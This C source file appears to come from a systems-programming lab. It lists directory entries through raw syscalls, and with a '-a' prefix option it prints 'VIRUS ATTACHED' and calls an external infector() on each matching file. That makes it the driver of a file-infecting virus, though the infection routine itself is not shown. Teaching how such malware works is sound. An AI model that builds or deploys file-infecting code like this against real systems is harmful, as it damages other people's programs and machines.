#include "util.h"

#define SYS_WRITE 4
#define STDOUT 1
#define SYS_OPEN 5
#define O_READONLY 00
#define O_RDWR 2
#define SYS_SEEK 19
#define SEEK_SET 0
#define SYS_GETDENTS 141
#define SHIRA_OFFSET 0x291

extern int system_call();
extern void infector(char* filepath);
extern void infection();
typedef struct ent{
    int inode;
    int offset;
    short len;
    char buf[1];
}ent;
int main (int argc , char* argv[], char* envp[])
{
    char buffer [8192];
    int i=0;
    int index=1;
    char* prefix = 0;
    int fd= system_call(SYS_OPEN, ".", O_READONLY, 0);
    int numbytes= system_call(SYS_GETDENTS,fd, buffer, 8192);
    ent* entp;
    while(index< argc){
        if(argv[index][0]=='-' && argv[index][1]=='a'){
            prefix= argv[index]+2;
        }
        index++;
    }
    while(i<numbytes){
        entp = (ent *)(buffer+i);
        if(prefix!= 0){
            if(strncmp(prefix, entp->buf, strlen(prefix))==0){
                system_call(SYS_WRITE, STDOUT, entp->buf, strlen(entp->buf));
                system_call(SYS_WRITE, STDOUT, "VIRUS ATTACHED", 15);
                system_call(SYS_WRITE, STDOUT, "\n", 2);
                infector(entp->buf);
            }
        }
        else if(prefix==0) {
                system_call(SYS_WRITE, STDOUT, entp->buf, strlen(entp->buf));
                system_call(SYS_WRITE, STDOUT, "\n", 2);
        }
        i=i+entp->len;
    }
    return 0;

    
}
